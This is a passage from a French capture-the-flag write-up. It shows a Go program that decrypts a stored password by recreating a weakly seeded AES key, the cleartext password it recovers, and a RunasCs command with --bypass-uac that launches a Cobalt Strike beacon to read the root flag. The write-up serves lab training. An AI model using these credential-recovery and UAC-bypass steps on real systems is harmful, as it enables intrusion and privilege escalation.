+</span></span><span class="line"><span class="cl">        <span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;math/rand&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;io&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;os&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;strconv&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;encoding/base64&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;crypto/cipher&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;crypto/aes&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">crand</span><span class="s">&#34;crypto/rand&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">seed</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">ParseInt</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">b64_encrypted_pass</span> <span class="p">=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">encrypted_pass</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">URLEncoding</span><span class="p">.</span><span class="nf">DecodeString</span><span class="p">(</span><span class="nx">b64_encrypted_pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">key</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">iv</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">rand</span><span class="p">.</span><span class="nf">Seed</span><span class="p">(</span><span class="nx">seed</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">key</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="nx">rand</span><span class="p">.</span><span class="nf">Intn</span><span class="p">(</span><span class="mi">254</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">io</span><span class="p">.</span><span class="nf">ReadAtLeast</span><span class="p">(</span><span class="nx">crand</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span> <span class="nx">iv</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">block</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">aes</span><span class="p">.</span><span class="nf">NewCipher</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">stream</span> <span class="o">:=</span> <span class="nx">cipher</span><span class="p">.</span><span class="nf">NewCFBDecrypter</span><span class="p">(</span><span class="nx">block</span><span class="p">,</span> <span class="nx">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">stream</span><span class="p">.</span><span class="nf">XORKeyStream</span><span class="p">(</span><span class="nx">encrypted_pass</span><span class="p">,</span> <span class="nx">encrypted_pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="nx">encrypted_pass</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="nx">encrypted_pass</span><span class="p">)</span><span class="o">-</span><span class="mi">40</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Et résultat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">go run recup-pass.go 20187148 &#34;fUkHjs17zgsuryIRLgsFp1db2S0XYAL24ptvMcefXEhuAo802CTINDOs3zoMDMIArMdCAvuH2gM=&#34;
+</span></span><span class="line"><span class="cl">hmCziGdAJepaFtCpFDXngjldIoWZeIZERuLsUGdw
+</span></span></code></pre></div><p>Super nickel! Maintenant on va pouvoir se connecter en tant que l&rsquo;utilisateur <code>backup</code>, mais attention il y&rsquo;a une difficulté supplémentaire: Si on essaye la fonctionnalité <code>spawnAs</code> de Cobalt Strike, on ne va pas recevoir de nouvelles session. La raison à cela est la présence de l&rsquo;<a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works">UAC</a>. Très brièvement cette mesure de sécurité de Windows implique que par défault les processus sont lancées dans un contexte de basse intégrité et que pour lancer un programme en tant que membre du groupe d&rsquo;aministrateurs locaux, un invite nommé le <code>consent prompt</code> va devoir être complété. Et cela vaut donc particulièrement pour l&rsquo;usage de la commande <code>runas</code>.</p>
+<p>Pour pouvoir outrepasser cette mesure depuis notre reverse shell on va utiliser ce <a href="https://github.com/antonioCoco/RunasCs">projet</a> très connu qui met à disposition un outil similaire à runas mais avec une option de bypass d&rsquo;UAC (Je ne vais pas rentrer dans les détails de comment le bypass fonctionne mais libre à vous d&rsquo;aller regarder).</p>
+<p>On va utiliser l&rsquo;option de cobalt strike <code>Pivoting -&gt; Listener</code> pour créer un nouveau listener et générer un nouveau beacon afin d&rsquo;obtenir la session en tant qu&rsquo;administrateur. On génère ensuite un payload stageless avec l&rsquo;option <code>Payloads -&gt; Windows Stageless Payload</code>, on l&rsquo;upload et on a plus qu&rsquo;à faire un:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell RunasCs.exe backup hmCziGdAJepaFtCpFDXngjldIoWZeIZERuLsUGdw &#34;c:\temp\www\internal\content\posts\internal-laps-alpha\beacon_x64.exe&#34; --bypass-uac
+</span></span></code></pre></div><p>Et on obtient le graal:</p>
+<div>
+    <img src="./assets/graal.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Et il ne reste plus qu&rsquo;à flag!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[02/04 11:09:05] beacon&gt; shell type C:\Users\Administrator\Desktop\root.txt
+</span></span><span class="line"><span class="cl">[02/04 11:09:05] [*] Tasked beacon to run: type C:\Users\Administrator\Desktop\root.txt
+</span></span><span class="line"><span class="cl">[02/04 11:09:05] [+] host called home, sent: 75 bytes
+</span></span><span class="line"><span class="cl">[02/04 11:09:05] [+] received output:
+</span></span><span class="line"><span class="cl">06f74385a548ddadb3edecfa752caea9
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
+<p>J&rsquo;ai beaucoup aimé cette box parce qu&rsquo;elle reposait beaucoup sur du reverse ce qui est assez rare, d&rsquo;autant plus que le Go constitute toujours un petit challenge dans ce domaine. La seule chose que je regrette c&rsquo;est que l&rsquo;option <code>execute-assembly</code> de Cobalt Strike pour executer RunasCs comme cela se fait usuellement en red team n&rsquo;a pas fonctionné sur cette box sans que je puisse vraiment comprendre pourquoi 😅.</p>
+</div>
+  
+    <div class="mt-16">
+
+</div>
+  
+</article>
+      </div>
+    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
+  <div class="flex justify-center items-center h-footer-height">
+    <div
+      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
+    >
+      <nav>
+        <ul class="flex text-md space-x-3 sm:space-x-6">
+          
+        </ul>
+      </nav>
+      <span class="text-muted hidden md:block">
+        &copy;
+        2024
+        <a
+          href="https://github.com/ntk148v/hugo-toigian"
+          class="font-bold hover:underline"
+          >hugo-toigian</a
+        >
+      </span>
+      <div id="header-theme-button">
+        <svg
+          id="dark_mode_btn"
+          class="hidden toolbox-btn"
+          width="18px"
+          height="18px"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke-width="1.5"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
+          />
+        </svg>
+        <svg
+          id="light_mode_btn"
+          class="hidden toolbox-btn"
+          width="18px"
+          height="18px"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke-width="1.5"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
+          />
+        </svg>
+      </div>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
